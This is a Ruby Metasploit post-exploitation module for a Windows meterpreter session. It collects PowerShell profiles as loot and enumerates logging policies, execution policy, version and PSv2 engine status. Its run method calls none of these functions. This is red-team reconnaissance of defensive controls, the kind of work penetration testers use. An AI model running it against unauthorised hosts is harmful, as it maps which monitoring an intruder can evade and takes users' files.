require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'
require 'msf/core/post/windows/extapi'


class MetasploitModule < Msf::Post

  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::ExtAPI
  include Msf::Post::Windows::Priv
  include Msf::Auxiliary::Report
  include Msf::Post::File


  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Collect Information on a Windows PowerShell Controls.',
      'Description'   => %q{
        Collect Information on a Windows Host.
      },
      'License'       => BSD_LICENSE,
      'Author'        => [ 'Carlos Perez <carlos.perez[at]trustedsec.com>' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run()
    print_status("Running post module ts_ps_controls against #{sysinfo['Computer']}")
  end

    # Enumerate users on the target box.
  #-----------------------------------------------------------------------
  def enum_users
    os = sysinfo['OS']
    users = []
    path4users = ""
    env_vars = session.sys.config.getenvs('SystemDrive', 'USERNAME')
    sysdrv = env_vars['SystemDrive']

    if os =~ /Windows 7|Vista|2008|2012|2016|8|10/
      path4users = sysdrv + "\\Users\\"
      profilepath = "\\Documents\\WindowsPowerShell\\"
    else
      path4users = sysdrv + "\\Documents and Settings\\"
      profilepath = "\\My Documents\\WindowsPowerShell\\"
    end

    if is_system?
      print_status("Running as SYSTEM extracting user list..")
      session.fs.dir.foreach(path4users) do |u|
        userinfo = {}
        next if u =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
        userinfo['username'] = u
        userinfo['userappdata'] = path4users + u + profilepath
        users << userinfo
      end
    else
      userinfo = {}
      uservar = env_vars['USERNAME']
      userinfo['username'] = uservar
      userinfo['userappdata'] = path4users + uservar + profilepath
      users << userinfo
    end
    return users
  end

  # Enumerate the profile scripts present and save a copy in loot.
  #-----------------------------------------------------------------------
  def enum_profiles(users)
    tmpout = []
    print_status("Checking if users have Powershell profiles")
    users.each do |u|
      print_status("Checking #{u['username']}")
      begin
        session.fs.dir.foreach(u["userappdata"]) do |p|
          next if p =~ /^(\.|\.\.)$/
          if p =~ /Microsoft.PowerShell_profile.ps1|profile.ps1/i
            ps_profile = session.fs.file.new("#{u["userappdata"]}#{p}", "rb")
            until ps_profile.eof?
              tmpout << ps_profile.read
            end
            ps_profile.close
            if tmpout.length == 1
              print_status("Profile #{p} for #{u["username"]} not empty, it contains:")
              tmpout.each do |l|
                print_line("\t#{l.strip}")
              end
              store_loot("powershell.profile",
                "text/plain",
                session,
                tmpout,
                "#{u["username"]}_#{p}.txt",
                "PowerShell Profile for #{u["username"]}")
            end
          end
        end
      rescue
      end
    end
  end

  # Enumerate the logging settings introduced in PowerShell 4.0
  #-----------------------------------------------------------------------
  def enum_logging(powershell_version)
    if powershell_version.to_i > 3
      mod_log_path = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging"
      script_log_path = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging"
      transcript_log_path = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription"
      win_pol_path = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows"

      print_status('Checking for logging.')
      if registry_enumkeys(win_pol_path).include?("PowerShell")

        # Check if module loging is enabled
        log_types = registry_enumkeys("#{win_pol_path}\\PowerShell")
        if log_types.include?('ModuleLogging')
          print_status('Module logging configured.')
          mod_log_val = registry_getvaldata( mod_log_path, "EnableModuleLogging" )
          if mod_log_val == 1
            print_good('Module logging is enabled')

            # Check if specific modules are being logged and if they are enum their names.
            if registry_enumkeys(mod_log_path).include?('ModuleNames')
              modnames = []
              registry_enumvals("#{mod_log_path}\\ModuleNames").each do |mname|
                print_good("\tModule: #{mname}")
                modnames << mname
              end
              report_note(
                :host   => session.session_host,
                :type   => 'host.control.ps',
                :data   => {
                  :control => "module_logging",
                  :enabled => true,
                  :modules => modnames},
                :update => :unique_data
              )
            end
          else
            print_good('Module logging is disabled')
            report_note(
              :host   => session.session_host,
              :type   => 'host.control.ps',
              :data   => {
                :control => "module_logging",
                :enabled => false,
                :modules => []},
              :update => :unique_data
            )
          end
        end

        # Check if script block loging is enabled
        if log_types.include?('ScriptBlockLogging')
          print_status('ScriptBlock logging configured.')
          sb_settings = registry_enumvals(script_log_path)
          if sb_settings.include?('EnableScriptBlockLogging')
            block_log = registry_getvaldata(script_log_path,'EnableScriptBlockLogging')
            if block_log == 1
              print_good("\tScript block logging is enabled.")
              report_note(
                :host   => session.session_host,
                :type   => 'host.control.ps',
                :data   => {
                  :control => "scriptblock_logging",
                  :enabled => true},
                :update => :unique_data
              )
            else
              print_good("\tScript block logging is disabled.")
              report_note(
                :host   => session.session_host,
                :type   => 'host.control.ps',
                :data   => {
                  :control => "scriptblock_logging",
                  :enabled => false},
                :update => :unique_data
              )
            end
          end

        else
          print_good("\tScriptBlock Loggin is not enabled.")
          report_note(
            :host   => session.session_host,
            :type   => 'host.control.ps',
            :data   => {
              :control => "scriptblock_logging",
              :enabled => false},
            :update => :unique_data
          )
        end
        # Check if transcription loging is enabled.
        if log_types.include?('Transcription')
          print_status('Transcript configured.')
          transcript_settings = registry_enumvals(transcript_log_path)
          if transcript_settings.include?('EnableTranscripting')
            if registry_getvaldata(transcript_log_path, 'EnableTranscripting') == 1
              print_good("\tTrascript logging is enabled.")
              report_note(
                :host   => session.session_host,
                :type   => 'host.log.ps_transcript',
                :data   => {
                  :enabled => true},
                :update => :unique_data
              )

              if transcript_settings.include?('OutputDirectory')
                transcript_loc = registry_getvaldata(transcript_log_path, 'OutputDirectory')
                if transcript_loc.length > 0
                print_good("\tTrascripts are saved to #{transcript_loc}")
                report_note(
                  :host   => session.session_host,
                  :type   => 'host.log.ps_transcript_alt_location',
                  :data   => {
                    :location => transcript_loc},
                  :update => :unique_data
                )
                else
                  print_good("\tTranscript is saved in users Documents folder.")
                end
              else
                print_good("\tTranscript is saved in users Documents folder.")
              end

            else
              print_good("\tTrascript logging is not enabled.")
              report_note(
                :host   => session.session_host,
                :type   => 'host.log.ps_transcript',
                :data   => {
                  :enabled => false},
                :update => :unique_data
              )
            end
          else
            print_good("\tTrascript logging is not enabled.")
            report_note(
              :host   => session,
              :type   => 'host.log.ps_transcript',
              :data   => {
                :enabled => false},
              :update => :unique_data
            )
          end
        else
          print_good("\tTranscript Loggin is not enabled.")
        end
      else
        print_good("\tNo PowerShell loggin settings are enabled.")
      end
    end
  end

  # Enumerate the PowerShell version.
  #-----------------------------------------------------------------------
  def enum_version
    if registry_enumkeys("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\").include?("3")
        powershell_version = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine","PowerShellVersion")
    else
        powershell_version = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine","PowerShellVersion")
    end

      print_good("Version: #{powershell_version}")
      report_note(
        :host   => session,
        :type   => 'host.info.ps',
        :data   => { :version => powershell_version },
        :update => :unique_data
      )
      return powershell_version
  end
  
  # Enumerate the ExecutionPolicy in place for User and Machine.
  #-----------------------------------------------------------------------
  def enum_execpolicy
    # Enumerate the machine policy
    begin
      powershell_machine_policy = registry_getvaldata("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell","ExecutionPolicy")
    rescue
      powershell_machine_policy = "Restricted"
    end

    # Enumerate the User Policy
    begin
      powershell_user_policy = registry_getvaldata("HKCU\\Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell","ExecutionPolicy")
    rescue
      powershell_user_policy = "Restricted"
    end
      print_good("Current User Execution Policy: #{powershell_user_policy}")
      print_good("Machine Execution Policy: #{powershell_machine_policy}")
      report_note(
        :host   => session.session_host,
        :type   => 'host.ps.execpol.user',
        :data   => { :execpol => powershell_user_policy },
        :update => :unique_data
      )
      report_note(
        :host   => session.session_host,
        :type   => 'host.ps.execpol.machine',
        :data   => { :execpol => powershell_machine_policy },
        :update => :unique_data
      )
  end

  #-----------------------------------------------------------------------
  def check_ps2enabled
    os = sysinfo['OS']
    if os =~ /Windows 2012|2016|8|10/
      print_status('Checking if PSv2 engine is enabled.')
      path = "HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1"
      if registry_enumkeys(path).include?("PowerShellEngine")
        if registry_getvaldata("#{path}\\PowerShellEngine", 'PowerShellVersion') == '2.0'
          print_good("\tPowerShell 2.0 engine feature is enabled.")
          report_note(
            :host   => session.session_host,
            :type   => 'host.info.ps_v2_feature',
            :data   => {
              :enabled => true},
            :update => :unique_data
          )
        else
          print_good("\tPowerShell 2.0 engine feature is not enabled.")
          report_note(
            :host   => session.session_host,
            :type   => 'host.info.ps_v2_feature',
            :data   => {
              :enabled => false},
            :update => :unique_data
          )
        end
      end
    end
  end
end